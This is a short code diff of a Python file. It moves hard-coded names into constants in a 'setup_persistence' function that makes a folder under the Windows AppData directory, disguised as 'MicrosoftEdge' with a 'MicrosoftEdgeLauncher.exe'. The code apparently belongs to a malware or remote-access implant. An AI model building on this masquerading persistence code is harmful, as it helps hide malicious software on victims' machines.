@@ -4,15 +4,20 @@ import shutil
 import subprocess
 import sys
 
+FOLDER_NAME = "MicrosoftEdge"
+EXE_FILE_NAME = "MicrosoftEdgeLauncher.exe"
+UUID_FILE_NAME = "uuid.txt"
+
+
 def setup_persistence() -> tuple[str, str]:
 
     os_type = platform.system()
 
     if os_type == "Windows":
         appdata = os.environ.get('appdata')
-        folder = os.path.join(appdata, "MicrosoftEdge")
-        exe_location = os.path.join(folder, "MicrosoftEdgeLauncher.exe")
-        uuid_location = os.path.join(folder, "uuid.txt")
+        folder = os.path.join(appdata, FOLDER_NAME)
+        exe_location = os.path.join(folder, EXE_FILE_NAME)
+        uuid_location = os.path.join(folder, UUID_FILE_NAME)
 
         os.makedirs(folder, exist_ok=True)
 
